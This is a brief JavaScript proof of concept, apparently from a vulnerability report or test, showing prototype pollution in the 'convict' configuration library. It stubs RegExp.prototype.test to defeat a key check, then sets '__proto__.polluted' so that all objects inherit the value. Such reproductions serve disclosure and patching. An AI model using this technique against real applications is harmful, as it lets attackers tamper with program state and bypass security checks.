RegExp.prototype.test = () => true;
const convict = require('convict');
let obj = {};
const config = convict(obj);
console.log({}.polluted);
config.set('__proto__.polluted', 'yes');
console.log({}.polluted);